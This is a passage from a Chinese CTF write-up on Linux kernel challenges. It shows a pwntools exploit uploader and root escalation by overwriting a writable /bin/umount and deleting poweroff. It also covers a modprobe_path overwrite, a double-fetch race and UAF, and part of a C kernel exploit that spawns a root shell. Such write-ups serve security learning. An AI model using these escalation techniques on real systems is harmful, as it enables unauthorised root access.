exec_cmd</span><span class="pun">(</span><span class="str">'cat pwn_enc | base64 -d &gt; pwn'</span><span class="pun">)</span><span class="pln">   </span></code></li><li class="L0"><code class="language-py"><span class="pln">    </span><span class="com">#exec_cmd('unzip pwn.zip') </span></code></li><li class="L1"><code class="language-py"><span class="pln">    exec_cmd</span><span class="pun">(</span><span class="str">'chmod +x pwn'</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">success</span><span class="pun">()</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> get_root</span><span class="pun">(</span><span class="pln">r</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="str">'./pwn'</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="str">'cat /flag'</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="kwd">def</span><span class="pln"> exploit</span><span class="pun">(</span><span class="pln">r</span><span class="pun">):</span></code></li><li class="L0"><code class="language-py"><span class="pln">    gen_bin</span><span class="pun">()</span></code></li><li class="L1"><code class="language-py"><span class="pln">    upload</span><span class="pun">(</span><span class="pln">r</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    get_root</span><span class="pun">(</span><span class="pln">r</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="kwd">if</span><span class="pln"> __name__ </span><span class="pun">==</span><span class="pln"> </span><span class="str">'__main__'</span><span class="pun">:</span></code></li><li class="L7"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'$ '</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">    </span><span class="kwd">print</span><span class="pln"> </span><span class="str">'[+] Linux is running ...'</span></code></li><li class="L9"><code class="language-py"><span class="pln">    exploit</span><span class="pun">(</span><span class="pln">r</span><span class="pun">)</span></code></li></ol></pre><div class="md-section-divider"></div><h3 data-anchor-id="gv91" id="补充-启动脚本注入办法">补充 启动脚本注入办法</h3><p data-anchor-id="63z0">rcS 位于 etc/init.d/ 中，内容如下：</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="78mo"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="com">#!/bin/sh</span></code></li><li class="L1"><code class="language-sh"></code></li><li class="L2"><code class="language-sh"><span class="pln">mount </span><span class="pun">-</span><span class="pln">t proc none </span><span class="pun">/</span><span class="pln">proc</span></code></li><li class="L3"><code class="language-sh"><span class="pln">mount </span><span class="pun">-</span><span class="pln">t devtmpfs none </span><span class="pun">/</span><span class="pln">dev</span></code></li><li class="L4"><code class="language-sh"><span class="pln">mkdir </span><span class="pun">/</span><span class="pln">dev</span><span class="pun">/</span><span class="pln">pts</span></code></li><li class="L5"><code class="language-sh"><span class="pln">mount </span><span class="pun">/</span><span class="pln">dev</span><span class="pun">/</span><span class="pln">pts</span></code></li><li class="L6"><code class="language-sh"></code></li><li class="L7"><code class="language-sh"><span class="pln">insmod </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">babyhacker</span><span class="pun">.</span><span class="pln">ko</span></code></li><li class="L8"><code class="language-sh"><span class="pln">chmod </span><span class="lit">644</span><span class="pln"> </span><span class="pun">/</span><span class="pln">dev</span><span class="pun">/</span><span class="pln">babyhacker</span></code></li><li class="L9"><code class="language-sh"><span class="pln">echo </span><span class="lit">0</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">/</span><span class="pln">proc</span><span class="pun">/</span><span class="pln">sys</span><span class="pun">/</span><span class="pln">kernel</span><span class="pun">/</span><span class="pln">dmesg_restrict</span></code></li><li class="L0"><code class="language-sh"><span class="pln">echo </span><span class="lit">0</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">/</span><span class="pln">proc</span><span class="pun">/</span><span class="pln">sys</span><span class="pun">/</span><span class="pln">kernel</span><span class="pun">/</span><span class="pln">kptr_restrict</span></code></li><li class="L1"><code class="language-sh"></code></li><li class="L2"><code class="language-sh"><span class="pln">cd </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span></code></li><li class="L3"><code class="language-sh"><span class="pln">chown </span><span class="pun">-</span><span class="pln">R root </span><span class="pun">/</span><span class="pln">flag</span></code></li><li class="L4"><code class="language-sh"><span class="pln">chmod </span><span class="lit">400</span><span class="pln"> </span><span class="pun">/</span><span class="pln">flag</span></code></li><li class="L5"><code class="language-sh"></code></li><li class="L6"><code class="language-sh"></code></li><li class="L7"><code class="language-sh"><span class="pln">chown </span><span class="pun">-</span><span class="pln">R </span><span class="lit">1000</span><span class="pun">:</span><span class="lit">1000</span><span class="pln"> </span><span class="pun">.</span></code></li><li class="L8"><code class="language-sh"><span class="pln">setsid cttyhack setuidgid </span><span class="lit">1000</span><span class="pln"> sh   </span><span class="com">#打开 shell ，进行交互 [A]</span></code></li><li class="L9"><code class="language-sh"></code></li><li class="L0"><code class="language-sh"><span class="pln">umount </span><span class="pun">/</span><span class="pln">proc</span></code></li><li class="L1"><code class="language-sh"><span class="pln">poweroff </span><span class="pun">-</span><span class="pln">f</span></code></li></ol></pre><p data-anchor-id="kv2j">注意上面所有命令行都是 busybox 的软链接。</p><p data-anchor-id="yjyb">在 [A] 处通过 <code>chacktty</code> 和 <code>sh</code>（还是 busybox）打开 shell 机型用户交互。 <br>
然后当你退出这句命令时，接下来就是 <code>umount /proc</code> 和 <code>poweroff</code> 关机了。整个 <code>rcS</code> 里面基本都是 <code>root</code> 进程，然后建立普通用户和普通权限，可以适当降权。如下：</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="amuf"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pln">cd </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span></code></li><li class="L1"><code class="language-sh"><span class="pln">chown </span><span class="pun">-</span><span class="pln">R root </span><span class="pun">/</span><span class="pln">flag</span></code></li><li class="L2"><code class="language-sh"><span class="pln">chmod </span><span class="lit">400</span><span class="pln"> </span><span class="pun">/</span><span class="pln">flag</span></code></li><li class="L3"><code class="language-sh"><span class="pln">chown </span><span class="pun">-</span><span class="pln">R </span><span class="lit">1000</span><span class="pun">:</span><span class="lit">1000</span><span class="pln"> </span><span class="pun">.</span></code></li></ol></pre><p data-anchor-id="m98b">但开机后，发现 <code>busybox</code> 和其它链接我们是可<strong>读写</strong>的，这就有很大的操作性了。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="eo36"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ ls </span><span class="pun">-</span><span class="pln">l </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span></code></li><li class="L1"><code class="language-sh"><span class="pln">total </span><span class="lit">2692</span></code></li><li class="L2"><code class="language-sh"><span class="pln">lrwxrwxrwx    </span><span class="lit">1</span><span class="pln"> pwn      </span><span class="lit">1000</span><span class="pln">             </span><span class="lit">7</span><span class="pln"> </span><span class="typ">Mar</span><span class="pln">  </span><span class="lit">8</span><span class="pln"> </span><span class="lit">04</span><span class="pun">:</span><span class="lit">30</span><span class="pln"> arch </span><span class="pun">-&gt;</span><span class="pln"> busybox</span></code></li><li class="L3"><code class="language-sh"><span class="pln">lrwxrwxrwx    </span><span class="lit">1</span><span class="pln"> pwn      </span><span class="lit">1000</span><span class="pln">             </span><span class="lit">7</span><span class="pln"> </span><span class="typ">Mar</span><span class="pln">  </span><span class="lit">8</span><span class="pln"> </span><span class="lit">04</span><span class="pun">:</span><span class="lit">30</span><span class="pln"> ash </span><span class="pun">-&gt;</span><span class="pln"> busybox</span></code></li><li class="L4"><code class="language-sh"><span class="pln">lrwxrwxrwx    </span><span class="lit">1</span><span class="pln"> pwn      </span><span class="lit">1000</span><span class="pln">             </span><span class="lit">7</span><span class="pln"> </span><span class="typ">Mar</span><span class="pln">  </span><span class="lit">8</span><span class="pln"> </span><span class="lit">04</span><span class="pun">:</span><span class="lit">30</span><span class="pln"> base64 </span><span class="pun">-&gt;</span><span class="pln"> busybox</span></code></li><li class="L5"><code class="language-sh"><span class="pun">-</span><span class="pln">rwxr</span><span class="pun">-</span><span class="pln">xr</span><span class="pun">-</span><span class="pln">x    </span><span class="lit">1</span><span class="pln"> pwn      </span><span class="lit">1000</span><span class="pln">       </span><span class="lit">2753048</span><span class="pln"> </span><span class="typ">Feb</span><span class="pln"> </span><span class="lit">25</span><span class="pln"> </span><span class="lit">06</span><span class="pun">:</span><span class="lit">21</span><span class="pln"> busybox</span></code></li></ol></pre><p data-anchor-id="x8y3">注意如果我们能在 exit 时，会继续以 root 执行<code>umount /proc</code>，然后 umount 我们也能读写，改写成一个 shell，就可以提权了。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="11w7"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ rm </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount </span></code></li><li class="L1"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ echo </span><span class="str">"#!/bin/sh"</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount</span></code></li><li class="L2"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ echo </span><span class="str">"/bin/sh"</span><span class="pln"> </span><span class="pun">&gt;&gt;</span><span class="pln"> </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount</span></code></li><li class="L3"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ chmod </span><span class="pun">+</span><span class="pln">x </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount </span></code></li><li class="L4"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ ls </span><span class="pun">-</span><span class="pln">l </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount </span></code></li><li class="L5"><code class="language-sh"><span class="pun">-</span><span class="pln">rwxr</span><span class="pun">-</span><span class="pln">xr</span><span class="pun">-</span><span class="pln">x    </span><span class="lit">1</span><span class="pln"> pwn      </span><span class="lit">1000</span><span class="pln">            </span><span class="lit">26</span><span class="pln"> </span><span class="typ">Mar</span><span class="pln"> </span><span class="lit">10</span><span class="pln"> </span><span class="lit">03</span><span class="pun">:</span><span class="lit">24</span><span class="pln"> </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">umount</span></code></li><li class="L6"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ exit</span></code></li><li class="L7"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ exit</span></code></li><li class="L8"><code class="language-sh"><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">sh</span><span class="pun">:</span><span class="pln"> can</span><span class="str">'t access tty; job control turned off</span></code></li><li class="L9"><code class="language-sh"><span class="str">/home/pwn #</span></code></li></ol></pre><p data-anchor-id="34fk">同理，还可以控制最后一句关机命令，使用命令 <code>rm /sbin/poweroff</code> ，使程序不能完全退出，再次进入时，拥有<code>root</code>权限。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="9b2u"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ rm </span><span class="pun">/</span><span class="pln">sbin</span><span class="pun">/</span><span class="pln">poweroff</span></code></li><li class="L1"><code class="language-sh"><span class="pun">~</span><span class="pln"> $ exit</span></code></li><li class="L2"><code class="language-sh"><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">init</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">rcS</span><span class="pun">:</span><span class="pln"> line </span><span class="lit">20</span><span class="pun">:</span><span class="pln"> poweroff</span><span class="pun">:</span><span class="pln"> not found</span></code></li><li class="L3"><code class="language-sh"></code></li><li class="L4"><code class="language-sh"><span class="typ">Please</span><span class="pln"> press </span><span class="typ">Enter</span><span class="pln"> to activate this console</span><span class="pun">.</span></code></li><li class="L5"><code class="language-sh"><span class="pun">/</span><span class="pln"> </span><span class="com">#</span></code></li></ol></pre><div class="md-section-divider"></div><h2 data-anchor-id="7is8" id="kernob">kernob</h2><div class="md-section-divider"></div><h3 data-anchor-id="9f8c" id="解题思路1">解题思路1</h3><p data-anchor-id="ykn0">内核使用了 <code>CONFIG_SLAB_FREELIST_HARDENED</code> 该编译选项，使释放的<code>slab</code>的指向下一个<code>slab</code>的地址上储存的不是下一个<code>slab</code>，而是一个<code>canary</code>。</p><p data-anchor-id="vv63">1.修改<code>modprobe_path</code>指向<code>/home/pwn/exp/copy.sh</code>:</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="xvp5"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pln">x</span><span class="pun">/</span><span class="pln">s </span><span class="lit">0xffffffff8245aba0</span></code></li><li class="L1"><code class="language-sh"><span class="lit">0xffffffff8245aba0</span><span class="pun">:</span><span class="pln"> </span><span class="str">"/home/pwn/exp/copy.sh"</span></code></li><li class="L2"><code class="language-sh"></code></li><li class="L3"><code class="language-sh"><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">exp</span><span class="pun">/</span><span class="pln">copy</span><span class="pun">.</span><span class="pln">sh</span><span class="pun">:</span></code></li><li class="L4"><code class="language-sh"><span class="com">#!/bin/sh</span></code></li><li class="L5"><code class="language-sh"><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">cp </span><span class="pun">/</span><span class="pln">flag </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">flag</span></code></li><li class="L6"><code class="language-sh"><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">chmod </span><span class="lit">777</span><span class="pln"> </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">flag</span></code></li></ol></pre><p data-anchor-id="husy">2.而后打开一个非法格式<code>ELF</code>触发，即以<code>root</code>身份运行<code>copy.sh</code></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="6kl2"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pln">echo </span><span class="pun">-</span><span class="pln">ne </span><span class="str">'\xff\xff\xff\xff'</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> fake</span></code></li><li class="L1"><code class="language-sh"><span class="pun">./</span><span class="pln">fake</span></code></li></ol></pre><p data-anchor-id="3okv"><a href="https://xz.aliyun.com/t/6067" target="_blank">参考链接</a></p><p data-anchor-id="94lr"><img src="http://static.zybuluo.com/leafish/jpp8avpsr27dzae7r1d9x6gz/image_1e693d72u1enl1cneadj3h41tng9.png" alt="image_1e693d72u1enl1cneadj3h41tng9.png-34.8kB" title=""></p><p data-anchor-id="pdah">可惜，该利用无法稳定每次获得内核地址信息，具体看分配的地址位置，利用非常麻烦</p><p data-anchor-id="r24z"><a href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank">利用参考</a></p><div class="md-section-divider"></div><h3 data-anchor-id="f7ts" id="解题思路2">解题思路2</h3><p data-anchor-id="216k">在驱动的<code>add_note()</code>函数中，从用户态传参到内核态时，在传入<code>size</code>值时，并没有使用<code>copy_from_user()</code>函数安全拷贝，而是连续两次比较了用户态的对应地址，而这引发了<code>double fetch</code>问题。</p><p data-anchor-id="zy3t"><img src="http://static.zybuluo.com/leafish/evsddfq2iq6gwhck86bsdr0w/image_1e6bda8am1d31h36ubj1ul83079.png" alt="image_1e6bda8am1d31h36ubj1ul83079.png-51.2kB" title=""></p><p data-anchor-id="dhtf">其次，由于在多核环境中，此<code>race</code>漏洞会容易触发。</p><p data-anchor-id="r8u0"><img src="http://static.zybuluo.com/leafish/55my5icnzf3lnwnm1bu6zlyb/image_1e6becjm0hvr1bct1odg13ugbv4m.png" alt="image_1e6becjm0hvr1bct1odg13ugbv4m.png-62.3kB" title=""></p><p data-anchor-id="azq4">如此，我们就可以分配任意大小的驱动结构体大小。同时在<code>delete_note()</code>中，存在着<code>uaf</code>漏洞。</p><p data-anchor-id="5s8f"><img src="http://static.zybuluo.com/leafish/413oe16gqt1ggrad5ho0hufa/image_1e6bh0sc91jdg1vir1b0urmt11lu13.png" alt="image_1e6bh0sc91jdg1vir1b0urmt11lu13.png-24.8kB" title=""></p><p data-anchor-id="z7sq">可以使用<code>tty_struct</code>结构体堆喷技术进行提权。</p><p data-anchor-id="nfh1">另外，学习了一种新的从内核态返回用户态的<code>getshell</code>技术，可以少找许多<code>gadget</code>。</p><div class="md-section-divider"></div><h3 data-anchor-id="sdmv" id="exp-1">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="dpu0"><ol class="linenums"><li class="L0"><code class="language-C"><span class="com">#define</span><span class="pln"> _GNU_SOURCE</span></code></li><li class="L1"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdio.h&gt;</span></code></li><li class="L2"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdlib.h&gt;</span></code></li><li class="L3"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;unistd.h&gt;</span></code></li><li class="L4"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/ioctl.h&gt;</span></code></li><li class="L5"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;string.h&gt;</span></code></li><li class="L6"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/types.h&gt;</span></code></li><li class="L7"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/stat.h&gt;</span></code></li><li class="L8"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;fcntl.h&gt;</span></code></li><li class="L9"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/mman.h&gt;</span></code></li><li class="L0"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;poll.h&gt;</span></code></li><li class="L1"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;pthread.h&gt;</span></code></li><li class="L2"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;errno.h&gt;</span></code></li><li class="L3"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdlib.h&gt;</span></code></li><li class="L4"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;signal.h&gt;</span></code></li><li class="L5"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;string.h&gt;</span></code></li><li class="L6"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/syscall.h&gt;</span></code></li><li class="L7"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;linux/userfaultfd.h&gt;</span></code></li><li class="L8"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;pthread.h&gt;</span></code></li><li class="L9"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;poll.h&gt;</span></code></li><li class="L0"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;linux/prctl.h&gt;</span></code></li><li class="L1"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdint.h&gt;</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"><span class="kwd">typedef</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> __attribute__</span><span class="pun">((</span><span class="pln">regparm</span><span class="pun">(</span><span class="lit">3</span><span class="pun">)))</span><span class="pln"> </span><span class="pun">(*</span><span class="pln">_commit_creds</span><span class="pun">)(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> cred</span><span class="pun">);</span></code></li><li class="L5"><code class="language-C"><span class="kwd">typedef</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> __attribute__</span><span class="pun">((</span><span class="pln">regparm</span><span class="pun">(</span><span class="lit">3</span><span class="pun">)))</span><span class="pln"> </span><span class="pun">(*</span><span class="pln">_prepare_kernel_cred</span><span class="pun">)(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> cred</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pln">_prepare_kernel_cred prepare_kernel_cred </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="pln">_prepare_kernel_cred</span><span class="pun">)</span><span class="lit">0xffffffff810ad7e0</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">_commit_creds commit_creds </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="pln">_commit_creds</span><span class="pun">)</span><span class="lit">0xffffffff810ad430</span><span class="pun">;</span></code></li><li class="L8"><code class="language-C"></code></li><li class="L9"><code class="language-C"><span class="typ">size_t</span><span class="pln"> user_cs</span><span class="pun">,</span><span class="pln"> user_ss</span><span class="pun">,</span><span class="pln"> user_rflags</span><span class="pun">,</span><span class="pln"> user_sp</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="kwd">void</span><span class="pln"> save_status</span><span class="pun">()</span></code></li><li class="L1"><code class="language-C"><span class="pun">{</span></code></li><li class="L2"><code class="language-C"><span class="pln">    __asm__</span><span class="pun">(</span></code></li><li class="L3"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%cs, %0;"</span></code></li><li class="L4"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%ss, %1;"</span></code></li><li class="L5"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%rsp,%2;"</span></code></li><li class="L6"><code class="language-C"><span class="pln">        </span><span class="str">"pushfq;"</span></code></li><li class="L7"><code class="language-C"><span class="pln">        </span><span class="str">"popq %3;"</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="pun">:</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_cs</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_ss</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_sp</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_rflags</span><span class="pun">)</span></code></li><li class="L9"><code class="language-C"><span class="pln">        </span><span class="pun">:</span></code></li><li class="L0"><code class="language-C"><span class="pln">        </span><span class="pun">:</span><span class="str">"memory"</span></code></li><li class="L1"><code class="language-C"><span class="pln">        </span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"><span class="pln">    puts</span><span class="pun">(</span><span class="str">"[*]status has been saved."</span><span class="pun">);</span></code></li><li class="L3"><code class="language-C"><span class="pun">}</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="kwd">void</span><span class="pln"> get_shell</span><span class="pun">(){</span></code></li><li class="L6"><code class="language-C"><span class="pln">    system</span><span class="pun">(</span><span class="str">"/bin/sh"</span><span class="pun">);</span></code></li><li class="L7"><code class="language-C"><span class="pun">}</span></code></li><li class="L8"><code class="language-C"></code></li><li class="L9"><code class="language-C"><span class="kwd">void</span><span class="pln"> get_root</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L0"><code class="language-C"><span class="pln">    commit_creds</span><span class="pun">(</span><span class="pln">prepare_kernel_cred</span><span class="pun">(</span><span class="lit">0</span><span class="pun">));</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">asm</span><span class="pun">(</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="str">"push %0\n"</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="str">"push %1\n"</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="str">"push %2\n"</span></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="str">"push %3\n"</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="str">"push %4\n"</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="str">"push $0\n"</span></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="str">"swapgs\n"</span></code></li><li class="L9"><code class="language-C"><span class="pln">    </span><span class="str">"pop %%rbp\n"</span></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="str">"iretq\n"</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="pun">:</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">:</span><span class="str">"m"</span><span class="pun">(</span><span class="pln">user_ss</span><span class="pun">),</span><span class="str">"m"</span><span class="pun">(</span><span class="pln">user_sp</span><span class="pun">),</span><span class="str">"m"</span><span class="pun">(</span><span class="pln">user_rflags</span><span class="pun">),</span><span class="str">"m"</span><span class="pun">(</span><span class="pln">user_cs</span><span class="pun">),</span><span class="str">"a"</span><span class="pun">(&amp;</span><span class="pln">get_shell</span><span class="pun">)</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pun">}</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="com">#define</span><span class="pln"> X_A_S </span><span class="lit">0xffffffff8101db17</span></code></li><li class="L7"><code class="language-C"><span class="com">#define</span><span class="pln"> ko_base </span><span class="lit">0xffffffffc0002000</span></code></li><li class="L8"><code class="language-C"><span class="com">#define</span><span class="pln"> modprobe_path </span><span class="lit">0xffffffff8245aba0</span><span class="pln">  </span></code></li><li class="L9"><code class="language-C"><span class="com">#define</span><span class="pln"> ADD </span><span class="lit">0x30000</span></code></li><li class="L0"><code class="language-C"><span class="com">#define</span><span class="pln"> DEL </span><span class="lit">0x30001</span></code></li><li class="L1"><code class="language-C"><span class="com">#define</span><span class="pln"> EDIT </span><span class="lit">0x30002</span></code></li><li class="L2"><code class="language-C"><span class="com">#define</span><span class="pln"> SHOW </span><span class="lit">0x30003</span></code></li><li class="L3"><code class="language-C"><span class="com">#define</span><span class="pln"> SIZE </span><span class="lit">0x70</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="kwd">struct</span><span class="pln"> noob</span><span class="pun">{</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> index</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">void</span><span class="pun">*</span><span class="pln"> ptr</span><span class="pun">;</span></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> size</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="pun">};</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="kwd">void</span><span class="pln"> add</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> fd</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> index</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> size</span><span class="pun">){</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> noob arg</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">index </span><span class="pun">=</span><span class="pln"> index</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">size </span><span class="pun">=</span><span class="pln"> size</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> ADD</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">arg</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pun">}</span></code></li><li class="L7"><code class="language-C"></code></li><li class="L8"><code class="language-C"><span class="kwd">void</span><span class="pln"> </span><span class="kwd">delete</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> fd</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> index</span><span class="pun">){</span></code></li><li class="L9"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> noob arg</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">index </span><span class="pun">=</span><span class="pln"> index</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> DEL</span><span class="pun">,</span><span 